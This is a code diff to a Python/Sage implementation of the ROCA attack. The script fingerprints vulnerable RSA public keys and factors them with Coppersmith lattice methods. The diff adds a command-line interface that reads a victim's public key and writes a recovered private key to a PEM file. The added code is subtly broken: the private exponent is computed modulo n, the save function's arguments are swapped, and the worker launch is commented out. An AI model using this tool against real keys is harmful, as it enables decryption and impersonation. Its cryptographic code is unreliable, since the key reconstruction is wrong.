@@ -1,5 +1,6 @@
 # coding: utf8
-import pdb
+import argparse
+import serialization as serialization
 from Crypto.PublicKey import RSA
 import time
 import multiprocessing
@@ -7,14 +8,7 @@ from fractions import gcd as gcd
 import math
 from multiprocessing import Process, Pool
 from sage.all_cmdline import *
-# from roca_fingerprint.detect import RocaFingerprinter
-import itertools
-from functools import reduce
-import subprocess
-import os
-import binascii
 import unittest
-
 
 class TestImplementation(unittest.TestCase):
 
@@ -129,11 +123,10 @@ class TestImplementation(unittest.TestCase):
 
         self.assertEqual(round(choose_divisor(5766152219975951659023630035336134306565384015606066319856068810, 962947420735983927056946215901134429196419130606213075415963491270, 29567546832423600, 2454106387091158800), 12), reference)
 
-
-
+TEST = False
+EXIT = False
 DEBUG = False
 
-dir = "/home/raphael/Desktop/ROCA_SAS/"
 start_time = time.time()
 """
 Parameter:
@@ -162,6 +155,7 @@ def get_start(c, ord, id):
 
 
 def worker(args):
+    global EXIT
     id = args['cpu']
     N = Integer(args['n'])
     M_strich = args['M_strich']
@@ -169,6 +163,7 @@ def worker(args):
     c = args['c']
     ord = args['ord_new']
     m = args['m']
+    privkey = args['privkey']
 
     beta = 0.5
     X = ceil(2 * pow(N, beta) / M_strich)
@@ -191,13 +186,32 @@ def worker(args):
         for root in roots:
             p = root * M_strich + int(Integer(65537).powermod(a_strich, M_strich))
             if N % p == 0:
+                EXIT = True
                 print("--- Success!!!! ---")
                 print("--- %s seconds ---" % (time.time() - start_time))
                 print("p: %d " % p)
-                print("q: %d " % (c-p))
-                exit(0)  # Todo: break gilt nur für die innere Schleife - Beenden aller threads
+                q = (N/p)
+                print("q: %d " % q)
+                n = (long(p*q))
+                print("n: %d " % n)
+                e = long(65537)
+                print("e: %d " % e)
+                d =  long(inverse_mod(e, n))
+                print("d: %d " % d)
+                private_key = RSA.construct((n, e, d))
+                save_key(privkey, private_key)
+        if EXIT:
+            break
     return
 
+def save_key(pk, filename):
+    pem = pk.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    with open(filename, 'wb') as pem_out:
+        pem_out.write(pem)
 
 def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
     #pdb.set_trace()
@@ -317,7 +331,6 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
         if root[0].is_integer():
 
             result = polZ(ZZ(root[0]))
-            print("GCD: %d, Modulus hoch Beta: %d" % (gcd(modulus, result), modulus^beta))
             if gcd(modulus, result) >= modulus ^ beta:
                 roots.append(ZZ(root[0]))
         #else:
@@ -404,7 +417,6 @@ def prime_factors(n):
     if n > 1:
         primfac.append(n)
 
-    print(primfac)
     return primfac
 
 
@@ -454,12 +466,9 @@ def greedy_heuristic(n, M, limes):
     while True:
 
         div_dict = {}
-        removed = []
-        # print("Primfaktor von Kandidat M: " + str(pf_M))
-        # print("Primfaktor von Ordnung von M: " + str(pfo))
 
         # Iteriert durch alle Ordnungen der Primfaktoren von der Ordnung von M
-        # Berechnet alle möglichen M_Strichs für die auswahl des besten Kandidaten für M_Strich
+        # Berechnet alle möglichen M_Strichs für die Auswahl des besten Kandidaten für M_Strich
         for p in reversed(pfo):
             pf_M_tmp = list(pf_M)
             M_new, pf_M_tmp = a2(M_old, pf_M_tmp, int(ord_new / p))  # Kandidat für M_strich
@@ -477,7 +486,7 @@ def greedy_heuristic(n, M, limes):
         # print(div_dict)
 
         ord_new /= best_candidate
-        limes = 141
+        #limes = 141
         if not log(div_dict[best_candidate][1], 2) > limes:
             if DEBUG:
                 print(M_old)
@@ -490,10 +499,10 @@ def greedy_heuristic(n, M, limes):
 
 
         if DEBUG:
-            #print("best candidate:" + str(best_candidate))
-            #print("M Strich nach Runde %d: %d" % (runde, M_old))
-            #print("ORD NEW: " + str(ord_new))
-            #print("PRIME Factors: " + str(pfo))
+            print("best candidate:" + str(best_candidate))
+            print("M Strich nach Runde %d: %d" % (runde, M_old))
+            print("ORD NEW: " + str(ord_new))
+            print("PRIME Factors: " + str(pfo))
             print("Log von N zur basis 2: %d" % limes)
             print("Log M_Strich zur basis 2: %d" % (log(M_old, 2)))
             print("Bitlength of M_strich %d nach Runde %d" % (int(M_old).bit_length(), runde))
@@ -503,11 +512,11 @@ def greedy_heuristic(n, M, limes):
     return M_old, ord_new
 
 
-def parm(n, M_strich, m, t, c, ord_new):
+def parm(n, M_strich, m, t, c, ord_new, privkey):
     rest = multiprocessing.cpu_count()
 
     while rest > 0:
-        yield {'cpu': rest, 'n': n, 'M_strich': M_strich, 'm': m, 't': t, 'c': c, 'ord_new': ord_new}
+        yield {'cpu': rest, 'n': n, 'M_strich': M_strich, 'm': m, 't': t, 'c': c, 'ord_new': ord_new, 'privkey': privkey,}
         rest -= 1
 
 
@@ -523,15 +532,24 @@ def fingerprint(M, n):
 
 
 if __name__ == "__main__":
-    with open('512.pub', 'r') as f:
+    if TEST:
+        unittest.main()
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('pubkey', help='File containing the public key')
+    parser.add_argument('privkey', help='File to write the private key')
+
+    args = parser.parse_args()
+
+    with open(args.pubkey, 'r') as f:
         pub_key = RSA.importKey(f.read())
 
-        print pub_key.size()
+        print "\nPublic Key with %d bits found" % pub_key.size()
         # print "Start Zeit: %f" % start_time
         param = get_param(pub_key.size())
 
         n = get_primes(param['anz'])
-        #unittest.main()
+
 
 
         M = calcM(n)
@@ -539,6 +557,9 @@ if __name__ == "__main__":
         # Checks if PubKey is Vulnerable to ROCA
         if fingerprint(M, pub_key.n) == 1:
             limes = math.log(pub_key.n, 2) / 4
+
+            print "limes: %d" % (limes*1.11)
+            limes = limes * 1.11
 
             M_strich, ord_new = greedy_heuristic(n, M, limes)
             if DEBUG:
@@ -550,8 +571,10 @@ if __name__ == "__main__":
             threads = []
             b = Mod(65537, M_strich)
             c = discrete_log(pub_key.n, b)
+            print("b: %d" % b)
+            print("c: %d" % c)
             #worker({'cpu': 0, 'n': pub_key.n, 'M_strich': M_strich, 'm': param['m'], 't': param['t'], 'c': c, 'ord_new': ord_new})
             p = Pool()
-            p.map(worker, parm(pub_key.n, M_strich, param['m'], param['t'], c, ord_new))
+            #p.map(worker, parm(pub_key.n, M_strich, param['m'], param['t'], c, ord_new, args.privkey))
         else:
             print("Resistant Key: Terminating execution!")
